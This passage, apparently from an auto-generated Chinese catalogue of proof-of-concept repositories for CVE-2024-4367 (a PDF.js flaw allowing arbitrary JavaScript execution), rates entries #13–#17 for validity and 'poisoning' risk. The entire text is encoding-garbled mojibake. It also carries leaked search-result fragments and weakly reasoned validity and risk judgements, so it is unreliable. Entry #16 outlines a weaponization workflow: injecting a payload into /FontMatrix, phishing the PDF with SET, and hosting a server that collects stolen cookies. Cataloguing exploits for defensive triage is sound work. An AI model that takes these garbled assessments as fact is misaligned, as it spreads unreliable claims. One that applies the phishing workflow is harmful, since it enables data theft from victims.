**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxï¼ŒFirefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡æ¡£ï¼Œå½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxï¼ŒFirefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç»•è¿‡ PDF.js å¯¹å­—ä½“çš„ç±»å‹æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„ JavaScript ä»£ç ã€‚æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡æ€§åœ¨äºå¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯èƒ½çªƒå–ç”¨æˆ·å‡­æ®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ä»…åŒ…å«GNUé€šç”¨å…¬å…±è®¸å¯è¯å£°æ˜ï¼Œå¹¶ä¸èƒ½åˆ¤æ–­æ¼æ´æœ‰æ•ˆæ€§ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ¼æ´ä»£ç æ‰èƒ½éªŒè¯ï¼Œä½†æ˜¯æ ¹æ®githubæœç´¢ç»“æœ [webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367 ï¼Œè¯æ˜POCæœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ç‰‡æ®µåªåŒ…å«äº†GNUé€šç”¨å…¬å…±è®¸å¯è¯çš„æ–‡æœ¬å†…å®¹ï¼Œå±äºå¼€æºåè®®çš„å£°æ˜ï¼Œ**ä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç æˆ–è€…é…ç½®æ–‡ä»¶**ï¼Œå› æ­¤æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œåˆ¤æ–­æŠ•æ¯’é£é™©ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [Zombie-Kaiser/cve-2024-4367-PoC-fixed](https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #13

**æ¥æº**: [CVE-2024-4367-avalahEE_pdfjs_disable_eval.md](../2024/CVE-2024-4367-avalahEE_pdfjs_disable_eval.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Firefox, Firefox ESR å’Œ Thunderbird æµè§ˆå™¨ä¸­çš„ PDF.js ç»„ä»¶çš„æ¼æ´ã€‚è¯¥æ¼æ´ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿçªƒå–ä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å®Œå…¨æ§åˆ¶å—å®³è€…çš„æµè§ˆå™¨ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å½±å“ç‰¹å®šç‰ˆæœ¬çš„Firefox, Firefox ESRå’ŒThunderbirdï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶æ¥è§¦å‘æ¼æ´ã€‚æ¼æ´åº“ä¿¡æ¯è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¾ƒä¸ºä¸¥é‡çš„é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé’ˆå¯¹Odoo 14.0çš„ä¿®å¤æ–¹æ¡ˆï¼Œç”¨äºç¦ç”¨PDF.jsä¸­çš„JavaScriptæ‰§è¡Œï¼Œä»¥è§„é¿CVE-2024-4367çš„å½±å“ã€‚è™½ç„¶ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œä½†éœ€è¦è°¨æ…è¯„ä¼°ã€‚ è¿™ä¸ªè¡¥ä¸é€šè¿‡æ›¿æ¢å’Œä¿®æ”¹ PDF.js ç›¸å…³çš„æ–‡ä»¶ï¼Œè¯•å›¾ç¦ç”¨ JavaScript æ‰§è¡Œã€‚ å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå¦‚æœè¯¥æ¨¡å—æœ¬èº«è¢«æ¶æ„ä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¼•å…¥å…¶ä»–æ¼æ´æˆ–åé—¨ã€‚ ä¾‹å¦‚ï¼Œ`pdfjs_disable_eval/static/src/viewer.html`æ–‡ä»¶æ›¿æ¢äº†åŸæœ‰çš„viewer.htmlï¼Œå¦‚æœæ–°çš„viewer.htmlä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½é€ æˆå±å®³ã€‚ æ€»ä½“æ¥è¯´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
2.  å—å®³è€…ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œçš„ JavaScript ä»£ç è¿›è¡Œæ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚ä¿¡æ¯çªƒå–æˆ–è¿œç¨‹æ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [avalahEE/pdfjs_disable_eval](https://github.com/avalahEE/pdfjs_disable_eval)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #14

**æ¥æº**: [CVE-2024-4367-clarkio_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-clarkio_pdfjs-vuln-demo.md)

## CVE-2024-4367-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨æ­¤æ¼æ´åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆå¦‚æœPDF.jsåœ¨Webç¯å¢ƒä¸­è¿è¡Œï¼‰æˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®Œå…¨æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Firefoxã€Thunderbirdï¼‰ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›®ï¼Œæ—¨åœ¨å±•ç¤ºå¦‚ä½•åˆ©ç”¨CVE-2024-4367æ¼æ´ã€‚å®ƒåŒ…å«Reactã€Vueå’ŒSvelteçš„å‰ç«¯ç»„ä»¶ï¼Œç”¨äºåŠ è½½å’Œæ˜¾ç¤ºPDFæ–‡ä»¶ã€‚README.mdæ–‡ä»¶æŒ‡ç¤ºå¦‚ä½•è¿è¡Œè¯¥é¡¹ç›®ä»¥åŠå¦‚ä½•æµ‹è¯•ä¸åŒçš„PDFæ–‡ä»¶ï¼ŒåŒ…æ‹¬åˆ©ç”¨è¯¥æ¼æ´çš„PDFæ–‡ä»¶ã€‚æ ¹æ®æè¿°ï¼Œé€šè¿‡ä¿®æ”¹ç»„ä»¶ä¸­å¼•ç”¨çš„PDFæ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„PDFåŠ è½½åˆ°è¿™äº›ç»„ä»¶ä¸­è¿›è¡Œæµ‹è¯•ã€‚æœç´¢å¼•æ“ç»“æœä¸­â€œ[webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367â€ è¡¨æ˜æ¼æ´åˆ©ç”¨ä»£ç å·²å…¬å¼€ã€‚ ç»¼ä¸Šï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå…¶ä¸­åŒ…å«package-lock.jsonç­‰æ–‡ä»¶ã€‚è™½ç„¶æ²¡æœ‰å‘ç°ç«‹å³å¯ä»¥åˆ¤æ–­ä¸ºæŠ•æ¯’çš„æ¶æ„ä»£ç ï¼Œä½†è€ƒè™‘åˆ°npmåŒ…ä¾›åº”é“¾çš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…åœ¨ä¾èµ–é¡¹ä¸­å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ¼”ç¤ºç¯å¢ƒæ¥å±•ç¤ºæ¼æ´ï¼Œå› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯æ­£å¸¸çš„æ¡†æ¶ä»£ç ã€‚ä¸è¿‡ï¼Œ**ä¸èƒ½å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½ï¼Œé£é™©ä¼°è®¡ä¸º10%**ã€‚ ä»£ç ä¸­å­˜åœ¨å¼•ç”¨å¤–éƒ¨npmåŒ…çš„å¯èƒ½æ€§ã€‚æ½œåœ¨é£é™©ç‚¹åŒ…æ‹¬ï¼šä¾èµ–åŒ…æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼›æ„å»ºæµç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ï¼›ä»¥åŠå¼€å‘è€…æ˜¯å¦æ•…æ„éšè—äº†æ¶æ„åŠŸèƒ½ã€‚ ä»”ç»†å®¡æŸ¥ `package-lock.json` æ–‡ä»¶ä¸­çš„ä¾èµ–é¡¹åŠå…¶æ¥æºï¼ŒéªŒè¯ä¾èµ–åŒ…çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¯ä»¥é™ä½æŠ•æ¯’é£é™©ã€‚ ç”±äºä»…ä»…æ˜¯demoä»£ç ï¼Œä¸”ä¾èµ–çš„åŒ…æ¯”è¾ƒå¤šï¼Œå› æ­¤è¿™é‡Œä¸èƒ½æ˜ç¡®è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  **æ¼æ´è§¦å‘ç‚¹ï¼š** PDF.jsåœ¨å¤„ç†PDFæ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ­¥éª¤ï¼š**
    *   æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç²¾å¿ƒè®¾è®¡çš„å­—ä½“æ•°æ®ã€‚
    *   å½“PDF.jsè§£æè¯¥PDFæ–‡ä»¶å¹¶å¤„ç†å­—ä½“æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä¼šè§¦å‘æ¼æ´ã€‚
    *   æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ä½“æ•°æ®ï¼Œå¯ä»¥åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
3.  **æ”»å‡»æ•ˆæœï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [clarkio/pdfjs-vuln-demo](https://github.com/clarkio/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #15

**æ¥æº**: [CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md](../2024/CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶æˆ–è®¿é—®åŒ…å«æ¶æ„PDFçš„ç½‘é¡µã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“çš„ä¸€ä¸ªæ¼æ´ã€‚ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼ˆè™½ç„¶åªæä¾›äº† package-lock.json æ–‡ä»¶ï¼Œä½†githubé¡µé¢å·²ç»è¯æ˜æ¼æ´çš„å­˜åœ¨ï¼‰ï¼Œå¯ä»¥ç¡®å®šæä¾›çš„POCä»£ç æœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©:**
æä¾›çš„ `package-lock.json` æ–‡ä»¶å±äºä¸€ä¸ª Node.js é¡¹ç›®ã€‚ä»è¿™ä¸ªæ–‡ä»¶æœ¬èº«æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ•æ¯’ã€‚ä½†æ˜¯ç”±äºgithubä¸Šå·²ç»æœ‰æ”»å‡»è€…æ„å»ºäº†å¯åˆ©ç”¨çš„pdfæ–‡ä»¶ï¼Œè¯´æ˜åˆ©ç”¨ç®€å•, å› æ­¤å¯ä»¥åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç æ¦‚ç‡æ¯”è¾ƒä½,çº¦10%ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  **æ”»å‡»è€…åˆ¶ä½œæ¶æ„ PDF æ–‡ä»¶ï¼š** è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº† PDF.js å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ã€‚
2.  **ç”¨æˆ·æ‰“å¼€æ¶æ„ PDF æ–‡ä»¶ï¼š**  ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  **æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼š** ç”±äºç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼ŒPDF.js å…è®¸åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [elamani-drawing/CVE-2024-4367-POC-PDFJS](https://github.com/elamani-drawing/CVE-2024-4367-POC-PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #16

**æ¥æº**: [CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md](../2024/CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€XSSæˆ–RCE

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œç”±äºå¯¹PDFæ–‡ä»¶ä¸­FontMatrixå¯¹è±¡çš„ç±»å‹æ£€æŸ¥ä¸è¶³ï¼Œå…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ï¼Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡ŒJavaScriptï¼Œä»è€Œå¯¼è‡´æ•°æ®ç›—çªƒã€XSSæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸åœ¨PDF.jsç¯å¢ƒä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå½±å“Firefoxã€Firefox ESRå’ŒThunderbirdçš„ç‰¹å®šç‰ˆæœ¬ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md) æè¿°äº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ã€‚è¯¥ä»£ç æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼ŒåŒ…æ‹¬ç¯å¢ƒè®¾ç½®ã€æ¼æ´åˆ©ç”¨ã€ç¤¾å·¥å’Œåå¤„ç†ã€‚ç»¼åˆæ¥çœ‹ï¼Œæä¾›çš„POCä»£ç **æœ‰æ•ˆ**ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶README.mdæ–‡ä»¶æœ¬èº«çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„æ¼æ´åˆ©ç”¨æŒ‡å—ï¼Œä½†ä»”ç»†åˆ†æè„šæœ¬æè¿°å’Œæ“ä½œæ­¥éª¤ï¼Œå‘ç°å…¶ä¾èµ–äºSocial Engineering Toolkit (SET)æ¥å‘èµ·é’“é±¼æ”»å‡»ï¼Œå¹¶ä¸”åŒ…å«æ‰§è¡Œä»»æ„jsçš„payload, å­˜åœ¨ä¸€å®šçš„**æŠ•æ¯’é£é™©**ã€‚Payloadå¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·å‡­æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥POCä»£ç ä¸­ï¼Œé£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ä¾èµ–å¤–éƒ¨å·¥å…·ï¼š** è„šæœ¬ä¾èµ–äºSETï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨SETçš„é…ç½®è¿‡ç¨‹è¿›è¡Œæ¶æ„é…ç½®ï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæœ‰å®³æ“ä½œã€‚
2.  **Payloadå¯å®šåˆ¶ï¼š** è„šæœ¬å…è®¸ç”¨æˆ·è‡ªå®šä¹‰JavaScript payloadï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚
3.  **ç¤¾ä¼šå·¥ç¨‹ï¼š** è„šæœ¬ä½¿ç”¨ç¤¾ä¼šå·¥ç¨‹æ‰‹æ®µä¼ æ’­æ¶æ„PDFï¼Œè¿™å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚
4.  **æ•°æ®å¤–æ³„ï¼š** Payloadå¯ä»¥çªƒå–æ•°æ®ï¼ˆå¦‚cookieï¼‰ï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

å› æ­¤ï¼Œæˆ‘ä¼°è®¡æ­¤ä»“åº“å­˜åœ¨**10%**çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„æ½œåœ¨æ¶æ„æ€§å’Œåˆ©ç”¨ç¤¾å·¥æ‰‹æ®µä¼ æ’­ä¸Šã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„â€œæŠ•æ¯’â€å¹¶éæŒ‡ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¾›åº”é“¾æŠ•æ¯’ï¼Œè€Œæ˜¯æŒ‡åˆ©ç”¨è¯¥POCè¿›è¡Œæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åµŒå…¥æ¶æ„ä»£ç æˆ–è¿›è¡Œæ¬ºéª—ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡ç¯å¢ƒï¼š** å®‰è£…Python 3.x, SETï¼Œä»¥åŠPyPDF2ç­‰ä¾èµ–ã€‚
2.  **åˆ›å»ºæ¶æ„PDFï¼š** ä½¿ç”¨æä¾›çš„è„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹`template.pdf`çš„`/FontMatrix`å­—æ®µï¼Œæ³¨å…¥JavaScript payloadï¼Œç”Ÿæˆ`malicious.pdf`ã€‚
3.  **ç¤¾å·¥æ”»å‡»ï¼š** ä½¿ç”¨SETæˆ–å…¶ä»–å·¥å…·ï¼Œé€šè¿‡ç”µå­é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼ï¼Œå°†`malicious.pdf`å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
4.  **æœåŠ¡å™¨ç›‘å¬ï¼š** è¿è¡Œä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡`malicious.pdf`ï¼Œå¹¶æ”¶é›†payloadçªƒå–çš„æ•°æ®ã€‚
5.  **å—å®³è€…äº¤äº’ï¼š** å—å®³è€…æ‰“å¼€`malicious.pdf`åï¼Œpayloadæ‰§è¡Œï¼Œçªƒå–æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [exfil0/WEAPONIZING-CVE-2024-4367](https://github.com/exfil0/WEAPONIZING-CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #17

**æ¥æº**: [CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md)

## CVE-2024-4367-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä¼šè¯åŠ«æŒç­‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

